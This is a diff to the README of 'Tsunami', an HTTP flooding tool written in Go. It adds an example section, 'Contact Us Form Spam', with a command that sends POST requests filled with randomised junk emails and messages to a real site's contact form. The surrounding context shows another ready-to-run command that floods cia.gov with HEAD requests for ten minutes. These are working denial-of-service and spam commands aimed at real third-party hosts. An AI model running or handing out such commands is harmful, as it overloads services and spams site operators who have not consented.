@@ -14,6 +14,7 @@ Tsunami is an advanced HTTP flooder written in Golang. It's currently implemente
 4. [Examples](#examples)
    - [Low Volume POST Flood Lasting Forever](#low-volume-post-flood-lasting-forever)
    - [High Volume HEAD Flood Lasting For 10 Minutes](#high-volume-head-flood-lasting-for-10-minutes)
+   - [Contact Us Form Spam](#contact-us-form-spam)
 5. [Dynamic Tokens](#dynamic-tokens)
 6. [Todo](#todo)
 
@@ -68,7 +69,10 @@ http://nsa.gov/IPa1
 ```bash
 ./tsunami -w 100 -s 600 "https://cia.gov/" HEAD
 ```
-
+### Contact Us Form Spam
+```bash
+./tsunami -w 1 "https://ammar.io/contact-us" POST "email={l}{l}{l}{l}{l}{l}{l}@gmail.com&message=spamspamspamspam"
+```
 ## Todo
  - Dynamic tokens (E.g {RANDOM_STRING}, {RANDOM_INT})
  - Custom headers
